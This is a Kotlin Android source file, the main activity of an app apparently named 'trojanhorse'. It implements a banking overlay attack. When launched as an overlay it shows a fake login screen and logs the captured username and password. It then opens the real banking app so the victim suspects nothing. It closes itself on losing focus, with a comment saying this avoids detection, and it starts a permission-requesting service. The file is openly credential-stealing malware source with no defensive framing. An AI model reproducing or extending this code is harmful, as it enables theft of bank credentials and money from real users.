package com.lookmyup.trojanhorse

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.material3.MaterialTheme

class MainActivity : ComponentActivity() {

    private val TAG = "TrojanHorse"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Check if we should show the login overlay or the normal app content
        val isOverlayMode = intent.component?.className == MainActivity::class.java.name &&
                intent.action != Intent.ACTION_MAIN

        if (!isOverlayMode) {
            // Start requesting permissions immediately (only in normal mode)
            ServiceStarter.requestPermissionsAndStartService(this)
        }

        val targetApp = BuildConfig.TARGET_PACKAGE

        setContent {
            MaterialTheme {
                if (isOverlayMode) {
                    // Show the fake login screen when launched as overlay
                    LoginScreen { username, password ->
                        // Log or handle the captured credentials
                        Log.d(TAG, "Captured credentials: $username / $password")

                        // Close this activity and launch the real banking app
                        val bankingAppIntent = packageManager.getLaunchIntentForPackage(targetApp)
                        if (bankingAppIntent != null) {
                            startActivity(bankingAppIntent)
                        }
                        finish()
                    }
                } else {
                    // Show control panel UI for managing the service
                    ServiceControlPanel()
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()

        // Don't handle permissions in overlay mode
        val isOverlayMode = intent.flags and Intent.FLAG_ACTIVITY_NEW_TASK != 0
        if (isOverlayMode) return

        // Continue permission flow if needed
        ServiceStarter.continuePermissionRequestIfNeeded(this)
    }



    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        // Only close when launched as overlay
        if (!hasFocus && intent.flags and Intent.FLAG_ACTIVITY_NEW_TASK != 0) {
            // App lost focus - user might be checking app switcher
            // Close immediately to avoid detection
            finish()
        }
    }
}